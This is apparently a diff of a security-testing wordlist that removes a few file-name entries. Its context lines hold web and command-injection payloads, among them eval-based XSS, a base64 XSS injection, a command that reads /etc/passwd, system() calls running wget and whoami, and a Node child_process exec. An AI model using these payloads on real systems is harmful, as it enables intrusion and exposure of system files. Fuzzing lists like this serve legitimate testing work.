@@ -519,7 +519,6 @@ line management engineering system (lems).exe.config
 line management engineering system (lems).vshost.exe
 line management engineering system (lems).vshost.exe.config
 line management engineering system (lems).vshost.exe.manifest
-line management engineering system (lems).xml
 logs/system(1).log
 mozilla/5.0 (linux; u; android 4.1.1; en-us; iphone operating system (ios) build/anon-x) applewebkit/534.30 (khtml, like gecko) version/4.0 mobile safari/534.30
 mozilla/5.0 (linux; u; android 4.1.1; en-us; iphone operating system (ios) build/apple) applewebkit/534.30 (khtml, like gecko) version/4.0 mobile safari/534.30
@@ -528,7 +527,6 @@ nintendo - family computer disk system (20161203-122905_cm).zip
 nintendo - family computer disk system (20161203-122905_rc).zip
 onload=\"a='aler';d='xss';b='t('+d+')';c=a+b;console.log(eval(c));
 perl/-e%20%22system('cat%20/etc/passwd');\%22
-php_curl_exec()_url_is_controlled_by_user.xml
 posix;eval($env{http_user_agent});exit;static const struct runtime_target runtime_offset[] = {
 possible assets/unity [old]/water system (test builds win32 64)/oceanbrdf_windowsbuild/oceanbrdf_windowsbuild/ocean_data/mono/etc/mono/1.0/defaultwsdlhelpgenerator.aspx
 possible assets/unity [old]/water system (test builds win32 64)/oceanbrdf_windowsbuild/oceanbrdf_windowsbuild/ocean_data/mono/etc/mono/2.0/defaultwsdlhelpgenerator.aspx
@@ -564,8 +562,6 @@ system('wget https://sn1persecurity.com/.testing/rce_vuln.txt');
 system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
 system('whoami')
 system('whoami');
-system(24-12-2013).xml
-system(8-1-2014).xml
 top.require('child_process').execsync('open -a calculator')
 with(location)with(hash)eval(substring(1))
 z"><input onfocus=eval(atob(this.id)) id=dmfyige9zg9jdw1lbnquy3jlyxrlrwxlbwvudcgic2nyaxb0iik7ys5zcmm9imh0dhbzoi8venlxys5nys9hcsi7zg9jdw1lbnquym9kes5hchblbmrdaglszchhkts&#61; autofocus>
